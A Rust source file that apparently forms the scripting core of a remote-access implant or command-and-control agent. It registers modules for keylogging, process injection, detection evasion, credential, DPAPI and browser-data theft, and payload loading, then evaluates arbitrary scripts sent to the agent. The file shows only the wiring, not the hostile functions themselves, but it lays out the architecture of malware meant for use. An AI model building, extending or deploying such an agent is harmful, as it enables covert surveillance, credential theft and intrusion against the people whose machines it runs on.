// src/agent/scripting/mod.rs
//
// Entry point for the Rhai extension engine.
// Each sub-module owns a focused slice of the API surface and exposes one
// `register(engine)` call.  Adding a new capability = new file + one line here.

mod win_ffi;
mod helpers;

// ── Original modules ───────────────────────────────────────────────────────
mod fs;
mod system;
mod network;
mod crypto;
mod media;
mod process;
mod memory;
mod dpapi;
mod browser;
mod search;
mod keylogger;
mod injection;
mod artifacts;
mod pipes;

// ── Round 2 additions ──────────────────────────────────────────────────────
mod io;
mod compress;
mod dns;
mod sysinfo;
mod evasion;
mod procinfo;
mod state;
mod loader;
mod credential;
mod registry;
mod winext;
mod python;

// Re-export for agent/mod.rs file browser.
pub use helpers::get_directory_json;

use rhai::{Engine, Scope, Dynamic};
use std::sync::{Arc, Mutex};
use std::collections::HashMap;

pub struct ExtensionManager {
    engine: Engine,
    scope:  Scope<'static>,
    // Shared KV store — all state::register closures hold an Arc clone.
    state:  Arc<Mutex<HashMap<String, String>>>,
}

impl ExtensionManager {
    pub fn new() -> Self {
        let mut engine = Engine::new();
        let state: Arc<Mutex<HashMap<String, String>>> =
            Arc::new(Mutex::new(HashMap::new()));

        // ── Original ──────────────────────────────────────────────────────
        fs::register(&mut engine);
        system::register(&mut engine);
        network::register(&mut engine);
        crypto::register(&mut engine);
        media::register(&mut engine);
        process::register(&mut engine);
        memory::register(&mut engine);
        dpapi::register(&mut engine);
        browser::register(&mut engine);
        search::register(&mut engine);
        keylogger::register(&mut engine);
        injection::register(&mut engine);
        artifacts::register(&mut engine);
        pipes::register(&mut engine);

        // ── Round 2 ───────────────────────────────────────────────────────
        io::register(&mut engine);
        compress::register(&mut engine);
        dns::register(&mut engine);
        sysinfo::register(&mut engine);
        evasion::register(&mut engine);
        procinfo::register(&mut engine);
        state::register(&mut engine, state.clone());
        loader::register(&mut engine);
        credential::register(&mut engine);
        registry::register(&mut engine);
        winext::register(&mut engine);

        // crypto and network round-2 extensions live in their own pub fn
        // to avoid a single 400-line file; call them here.
        crypto::register_crypto_ext(&mut engine);
        network::register_network_ext(&mut engine);

        python::register(&mut engine);

        Self { engine, scope: Scope::new(), state }
    }

    pub fn run_script(&mut self, script_content: &str, args: Vec<String>) -> String {
        let rhai_args: Vec<Dynamic> = args.into_iter().map(|s| s.into()).collect();
        self.scope.set_or_push("args", rhai_args);
        match self.engine.eval_with_scope::<String>(&mut self.scope, script_content) {
            Ok(result) => result,
            Err(e)     => format!("[Script Exception]: {}", e),
        }
    }
}
